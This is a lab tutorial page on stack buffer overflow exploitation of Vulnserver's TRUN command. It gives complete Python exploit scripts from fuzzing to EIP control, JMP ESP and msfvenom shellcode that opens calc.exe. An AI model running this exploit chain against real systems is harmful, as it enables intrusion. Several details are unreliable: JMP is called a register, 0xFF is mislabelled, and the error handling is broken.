---
### The title for the content.
title: "Buffer Overflow"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "Buffer Overflow"
### The title of the page in menu will be prefixed by this HTML content
pre: "<i class='fas fa-layer-group'></i> "
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "Buffer Overflowaaaaaaaaaaaaaaaaaaaaaaaaaa."
### The datetime assigned to this page.
date: 2020-03-10T16:43:45+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "bufferoverflow"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight: 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## Buffer Overflow

This is mainly aimed at beginner/OCSP level BO.

### Steps

1. Crash The Application
   1. Spiking
   2. Fuzzing
2. Find EIP Offset
3. Control ESP
4. Identify Bad Characters
5. Find JMP ESP
6. Generate Shell Code
7. Exploit

### Definitions

|                 |                                                                                                                                                         |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| EIP             | The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command.                      |
| ESP             | The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application. |
| JMP             | The Jump (JMP) is a register that performs an unconditional jump to transfer the flow of execution by changing the EIP register.                        |
| \x41, \x42 \x43 | The hexadecimal values for A, B and C.                                                                                                                  |

### Skeleton Python Script

The easiest way to stay organized when writing these scripts is to use a skeleton file. The below is the going to be your working grounds for the rest of these exercises. I recommend that after each step has been completed, you create a copy of the script and name it at the step you completed. This way, if you get stuck, you can go back to a working step.

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

#offset  = ?

buff    = b""  # empty byte var

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b"%s" % buff)
except RuntimeError as Err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
```

### Crash The Application

#### [Spiking](https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE)

With SPIKE we can try to overflow each possible command.

Lets first look at what the program can do.

```bash
root@kali:~# nc 192.168.136.130 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
EXT
GOODBYE
```

Basic commands of SPIKE:

```bash
s_string(argument); // Sends the argument without modification to he application
s_string_variable(“random”); // Sends an array of random data to he application
s_readline(); // Reads one line from the response
```

So lets start testing the Commands

Lets create .spk files for each command

Example for STATS

```bash
s_readline();
s_string("STATS ");
s_string_variable("b0b");
```

Then we run a script called 'generic_send_tcp' from the SPIKE framework that will test this command for us.

`generic_send_tcp 192.168.138.130 9999 STATS.spk 0 0`

![Spiking the application](images/BO_spike.png)

![Debugger while spiking](images/BO_spike_2.png)

![Wireshark while spiking](images/BO_wireshark.gif)

After this is finished running we can look at our debugger. If the program crashed teh debugger will be in a paused state.  
In this case it looks like STATS is not vulnerable.

![No overflow](images/BO_nocrasch.png)

After testing the following commands are vulnerable

##### TRUN

![TRUN overflow](images/BO_trunoverflow.png)

##### GMON

![GMON overflow](images/BO_gmonoverflow.png)

##### KSTET

![KSTET overflow](images/BO_kstetoverflow.png)

##### GTER

![GTER overflow](images/BO_GTER_overflow.png)

##### HTER

![HTER overflow](images/BO_HTERoverflow.png)

##### LTER

![LTER overflow](images/BO_LTER_overflow.png)

#### Fuzzing

Now that we know some params are vulnerable to overflows we can start to fuzz and find out where they break. For now we will focus on TRUN.  
Fuzzing is sending over 'junk' data in increments, in this example increments of 100 bytes, to find the general point where the program breaks.

This can be done with some python code.

```python
#!/usr/bin/python

import socket,sys
from time import sleep

address = '192.168.136.130'
port    = 9999

offset  = 100

while True:
    try:
        buffer  = b""         # empty byte var
        buffer += b"A"*offset # junk times offset
        print(f'[+] Sending buffer: {str(len(buffer))} bytes')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address,port))
        s.recv(1024)
        s.send(b"TRUN /.:/%s \r\n" % buffer)
        offset += 100
        sleep(1)
    except RuntimeError as Err:
        print(f'[!] Unable to connect to the application. {err}')
        sys.exit(0)
    finally:
        s.close()
```

When we run this python script it will run until we send over a buffer large enough where it breaks. In this case the program crashed at a buffer of 2109 bytes (`TRUN /.:/ + 'A'*2100`).

```bash
root@kali:/mnt/hgfs/_shared_folder/BO python3 trun_1.py
[+] Sending buffer: 109 bytes
[+] Sending buffer: 209 bytes
[+] Sending buffer: 309 bytes
[+] Sending buffer: 409 bytes
[+] Sending buffer: 509 bytes
[+] Sending buffer: 609 bytes
[+] Sending buffer: 709 bytes
[+] Sending buffer: 809 bytes
[+] Sending buffer: 909 bytes
[+] Sending buffer: 1009 bytes
[+] Sending buffer: 1109 bytes
[+] Sending buffer: 1209 bytes
[+] Sending buffer: 1309 bytes
[+] Sending buffer: 1409 bytes
[+] Sending buffer: 1509 bytes
[+] Sending buffer: 1609 bytes
[+] Sending buffer: 1709 bytes
[+] Sending buffer: 1809 bytes
[+] Sending buffer: 1909 bytes
[+] Sending buffer: 2009 bytes
[+] Sending buffer: 2109 bytes
[!] Unable to connect to the application.
```

![TRUN Crash](images/BO_TRUN_crash_at_2100.png)

### Find EIP Offset

Now that we know the application crashes at around 2100 bytes we should try to pinpoint the offset of the EIP register.  
We want todo this since the EIP contains the address of the next instruction, meaning if we control the EIP we can control what the program does next.

To find the offset we can use a pattern, one we can use `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`

```bash
root@kali:/mnt/hgfs/_shared_folder/BO# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
```

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

#offset  = around 2100

pattern = b"Aa0Aa1Aa....7Cu8Cu9Cv0Cv1Cv2C"  # output of pattern_create.rb
buff    = b""              # empty byte var
buff    = b"%s" % pattern  # add pattern to buff

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b"TRUN /.:/%s" % buff)
except RuntimeError as Err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()

```

![Offest 1](images/BO_offset_1.png)

EIP value: 386f4337 (8oC7)

To find the offset we can use /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb

```bash
root@kali:/mnt/hgfs/_shared_folder/BO /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386f4337
[*] Exact match at offset 2003
```

#### Controlling the ESP

Now that we know that the offset to the EIP is 2003 bytes, we need to fill the stack with that many bytes. So if we send over 2003 bytes of junk data we end up at byte 2004. This should be the start of the EIP.

To verify that this is indeed the EIP we will fill byte 2004,2005,2006,2007 with B's. This should result in the EIP containing 4 B's (42424242 in hex).

We also add some extra junk to get an idea of how much space we have on the stack.

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

buff  = b""         # empty byte var
buff += b'A'*offset # junk
buff += b'B'*4      # EIP
buff += b'C'*256    # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256    # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128    #
buff += b'F'*128    #
buff += b'G'*64     #
buff += b'H'*64     #
buff += b'I'*32     #
buff += b'J'*32     #

print(buff)

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b"TRUN /.:/%s" % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application.')
    sys.exit(0)
finally:
    s.close()
```

![Overwritten EIP 1](images/BO_EIP_424242.png)

Success !

![Overwritten EIP 2](images/BO_overwritten_EIP.png)

here we can see we have at least 960 bytes of space left on the stack to store our shellcode.

![Extra space on stack](images/BO_extra_space_on_stack.png)

### Finding Bad Characters

So now that we control the EIP we want to get our shellcode where the C's are right ? Well no, not yet.

First we need to do some 'house cleaning' and remove bad characters.

Bad characters is simply a list of unwanted characters that can would break the shellcode. There is no universal set of bad characters, this depends on the application and the developer logic. That means we have to find the bad characters in vulnserver before writing shellcode.

Some of the common bad characters are:

| HEX | explanation     | ascii |
| --- | --------------- | ----- |
| 00  | NULL            |       |
| 0A  | Line Feed       | \n    |
| 0D  | Carriage Return | \r    |
| FF  | Form Feed       | \f    |

To test for Bad Characters we simply trow every possible character in hex format at the application and see if any of act up.

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

command = b'TRUN /.:/'
offset  = 2003

bad_chars = [0x00]
chars = b""
for i in range(0x00,0xFF+1):
    if i not in bad_chars:
        chars += bytes([i])

buff  = b""         # empty byte var
buff += b"A"*offset # junk
buff += b"B"*4      # EIP
buff += b"" + chars # test for chars

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b"TRUN /.:/%s" % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
```

Now right click on the ESP and show hexdump

![Follow in Dump](images/BO_show_hexdump.png)

Here we see all the chars. Now we simply count up from 01 to FF. If any are missing this is a 'bad character' and we should exclude it when generating shellcode.

![Memory Dump](images/BO_memdump.png)

### Find JMP ESP

Now that we know the offset of the EIP, know what characters we can use for our shellcode and saw we have plenty of space on the stack we can start locking for a JMP ESP.

We do that since if we find a adresspace in memory where a JMP ESP currently lives and point the EIP at that adresspace we are telling the program to execute what we currently have stored on the stack (i.e. our shellcode).

To find a JMP ESP we can start looking for a DLL that has no protection mechanisms. We can do this with a plugin called mona.

`!mona modules`

Here we found a DLL that has no protections enabled.

![Mona modules](images/BO_mona_modules.png)

Now we can look if this DLL has a JMP ESP. To search for this we need to know the OPCODE equivalent of a JMP ESP.

If we don't know this we can use a tool called nasm_shell

```bash
root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm >
```

`!mona find -s "\xFF\xE4" -m essfunc.dll`

![Find JMP ESP](images/BO_find_jmp_esp.png)

`625011af` is the address of a jump point. We want to add this value to our python script in place of the B's.

But since where on a x86 system it uses Little Endian Format. This means that the lowest byte is stored at the lowest addres and the highest order byte at the highest.

So it will look something like this.

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b"C"*256

buff  = b""                 # empty byte var
buff += b"A"*offset         # junk
buff += b"\xAF\x11\x50\x62" # EIP to JMP ESP
buff += b'C'*256            # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256            # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128            #
buff += b'F'*128            #
buff += b'G'*64             #
buff += b'H'*64             #
buff += b'I'*32             #
buff += b'J'*32             #

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b"TRUN /.:/%s" % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
```

Now to verify if everything is in place we can add a breakpoint at the JMP ESP address.

Search for the address space

![Find Address](images/BO_find_address.png)

Press F2 to add a breakpoint

![Breakpoint](images/BO_breakpoint.png)

Now if we run our python script we can verify that EIP is pointing at the JMP ESP

![Stoped on JMP ESP](images/BO_stoped_on_JMP_ESP.png)

### Generate Shellcode

Now that everything is in place we can generate our shellcode. We can do this with MSFvenom.

The command below will generate shellcode that will start the windows calculator.

```bash
root@kali:/mnt/hgfs/_shared_folder/BO# msfvenom -p windows/exec CMD=calc.exe -b '\x00\' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of c file: 949 bytes
unsigned char buf[] =
"\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e"
"\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f"
"\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6"
"\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25"
"\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b"
"\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e"
"\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c"
"\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde"
"\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c"
"\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31"
"\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86"
"\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40"
"\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc"
"\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e";
```

We can now add this shellcode to our python script.

We are also going to add something else, a NOP sled.

A NOP (No-OPeration) is a instruction that does nothing. It simply tells the CPU to skip this instruction and go to the next. When adding a bunch NOPs we create something called a NOP sled. We do this since we cant be certain where in memory we will jump to, so by adding these NOPs the CPU will just glide down the NOPs to our shellcode.

```python
#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b"\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e"

buff  = b""                 # empty byte var
buff += b"A"*offset         # junk
buff += b"\xAF\x11\x50\x62" # EIP to JMP ESP
buff += b"\x90"*32          # NOP sled
buff += b"%s" % shellcode   # add shellcode to buffer

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b"TRUN /.:/%s" % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
```

### Exploit

Now just run the script and if everything goes correctly we should be greeted by a friendly calculator.

![popped](images/BO_popped.png)

### Also see

* [Gh0x0st/Buffer_Overflow](https://github.com/gh0x0st/Buffer_Overflow)
* [bufferoverflows.net](https://bufferoverflows.net/exploiting-vanilla-buffer-overflow-in-vulnserver-trun-command/)
* [Vulnserver](https://github.com/stephenbradshaw/vulnserver)
